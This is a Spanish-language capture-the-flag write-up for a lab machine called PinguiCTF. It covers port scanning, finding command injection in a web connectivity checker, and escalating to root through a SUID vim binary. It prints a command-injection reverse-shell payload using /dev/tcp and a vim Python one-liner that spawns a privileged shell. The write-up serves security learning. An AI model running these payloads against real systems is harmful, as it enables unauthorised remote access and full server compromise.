# PinguiCTF

## 🔎 Enumeración

Se realiza un escaneo de puertos utilizando **Nmap**, identificando únicamente el puerto 80 (HTTP) abierto

<img width="707" height="148" alt="Pasted image 20260217102932" src="https://github.com/user-attachments/assets/37a61dbf-55d9-472a-8de0-47961e4d77be" />

## 🌐 Análisis del servicio web

Visitamos la pagina web y vemos que es herramienta para verificar conectividad

<img width="775" height="398" alt="Pasted image 20260217103125" src="https://github.com/user-attachments/assets/28644b3d-79e5-420f-a2d7-19774506b920" />

Primero se verifica si la aplicación es vulnerable a ```SSTI (Server-Side Template Injection)```, pero tras múltiples pruebas se descarta esta vulnerabilidad

<img width="725" height="226" alt="Pasted image 20260217103257" src="https://github.com/user-attachments/assets/1d74c82b-95ef-4612-b307-87b50183095b" />

Sin embargo, durante el análisis se identifica que la aplicación sí es vulnerable a **Remote Command Execution** ```(RCE)```

<img width="792" height="227" alt="Pasted image 20260217103718" src="https://github.com/user-attachments/assets/140af3c4-1268-4808-97f1-7ea49a4b321c" />

## 💥 Explotación – Reverse Shell

Una vez confirmada la vulnerabilidad **RCE**, se procede a enviar una reverse shell mediante el siguiente payload:

```bash
; bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
```

<img width="733" height="338" alt="Pasted image 20260217105052" src="https://github.com/user-attachments/assets/f8afbd03-418a-4ff5-ba96-8b01ce3341e8" />

Nos colocamos en escucha en nuestra máquina atacante y ejecutamos el payload, logrando acceso remoto al sistema

<img width="552" height="95" alt="Pasted image 20260217105247" src="https://github.com/user-attachments/assets/f3e357d9-3ecb-4da3-9a28-0d4206589e9f" />

Realizamos tratamiento de TTY

<img width="240" height="140" alt="Pasted image 20251222222913" src="https://github.com/user-attachments/assets/137456ec-0393-4d4a-9c97-18cb6dbfe880" />

## 🔐 Escalada de Privilegios

Tras obtener acceso inicial, se intenta escalar privilegios, pero en primera instancia no se consigue

<img width="422" height="117" alt="Pasted image 20260217105550" src="https://github.com/user-attachments/assets/4267f9a8-ba49-40c7-81d8-ddc564075f66" />

Se procede entonces a buscar binarios con permisos elevados ```(SUID o ejecutables como root)```. Durante la enumeración, llama la atención el binario:
```/usr/bin/vim.basic```
 
<img width="681" height="235" alt="Pasted image 20260217105733" src="https://github.com/user-attachments/assets/cf55066e-c3a5-4208-8045-5d1769a03879" />

Este binario puede ser explotado para escalar privilegios mediante ejecución de código **Python**:

```bash
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

Al ejecutar este comando, se obtiene una shell con privilegios elevados.

<img width="176" height="82" alt="Pasted image 20260217114751" src="https://github.com/user-attachments/assets/810e5fd4-bfd1-4e09-a121-e0f59dc57153" />

## 🏁 Conclusión 

Este escenario demuestra cómo una pequeña vulnerabilidad en una aplicación web puede comprometer la totalidad de un servidor: tras identificar y explotar una ejecución remota de comandos (RCE) para ganar acceso inicial, se aprovechó una mala configuración de permisos (SUID) en un binario del sistema para escalar privilegios, permitiendo al atacante pasar de un usuario sin poderes a tener control absoluto como root.
